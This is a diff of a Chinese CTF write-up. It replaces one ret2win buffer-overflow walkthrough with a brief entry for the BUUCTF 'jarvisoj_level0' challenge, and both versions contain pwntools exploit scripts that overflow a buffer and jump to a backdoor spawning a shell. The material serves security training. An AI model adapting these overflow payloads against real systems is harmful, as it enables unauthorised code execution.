@@ -675,65 +675,38 @@ if __name__ == "__main__":
 
 ```
 
-#### 一个例题
+#### 例题 3：jarvisoj_level0_1
 
-反编译，`main` 函数如下：
+[BUU CTF 题目链接](https://buuoj.cn/challenges#jarvisoj_level0)
 
-<img width="1280" height="598" alt="image" src="https://github.com/user-attachments/assets/fe6fdda7-885a-4ad9-9692-8d9fea3ea927" />
+和上两道题没什么太大区别。
 
-`vulnerable` 函数如下：
+可能多了一个 `rop --grep "ret"` 得到 ret 地址。
 
-<img width="1273" height="591" alt="image" src="https://github.com/user-attachments/assets/ca11bf87-ccc1-438c-8ca4-ee25210b2ea5" />
-
-发现 `gets(v1)` 函数不检查长度，而 `v1[12]` 长度只有12。
-
-<img width="1280" height="602" alt="image" src="https://github.com/user-attachments/assets/639b339f-f32f-45e6-a8d4-8679fd0e73ef" />
-
-`backdoor` 函数直接就是我们想要的 `system("/bin/sh")`。
-
-按照计算，我们需要先把 `buffer` 和 `rbp` 顶掉，20个 `A` 即可，然后我们再发送 `backdoor` 地址。
-
-在 `IDA View-A` 中找到地址：
-
-<img width="1280" height="629" alt="image" src="https://github.com/user-attachments/assets/e8d609d6-9e23-462e-b6b6-78bb8c969dfe" />
-
-`.text:00000000004011B6` 这就是 `backdoor` 的地址。
+不再详细写解题步骤。
 
 ```
+# written by Sonnety
 from pwn import *
 
-target_ip = ''
-target_port = 
+host = "node5.buuoj.cn"
+port = 28777
 
-# 创建远程连接
-io = remote(target_ip, target_port)
+offset = 136
+backdoor = 0x400596
+ret_addr = 0x400431
 
-# (可选) 如果是本地调试，可以用 process
-# io = process('./pwn') 
+def main():
+	io=remote(host,port)
+	try:
+		io.recvuntil(b"Hello World",timeout=2)
+	except Exception:
+		pass
+	payload=b"A"*offset+p64(ret_addr)+p64(backdoor)
+	io.sendline(payload)
+	io.interactive()
+if __name__ == "__main__":
+	main()
 
-# 根据刚才的 IDA 分析：
-# Buffer(12) + RBP(8) = 20
-offset = 20 
-
-# Backdoor 函数地址 (0x4011B6)
-# 也可以用 elf.symbols['backdoor'] 自动获取，但手填也没问题
-backdoor_addr = 0x4011B6
-
-# 3. 构造 Payload
-# 垃圾数据填充 (20个 'A')
-payload = b'A' * offset
-
-# 拼接后门地址
-payload += p64(backdoor_addr)
-
-# 发送攻击
-# 先接收一下程序输出的欢迎语 "Tell me your name:"
-io.recvuntil(b"name:")
-
-# 发送我们的 Payload
-io.sendline(payload)
-
-# 5. 拿到 Shell 权限
-print("Payload sent! Switching to interactive mode...")
-io.interactive()
 ```
+
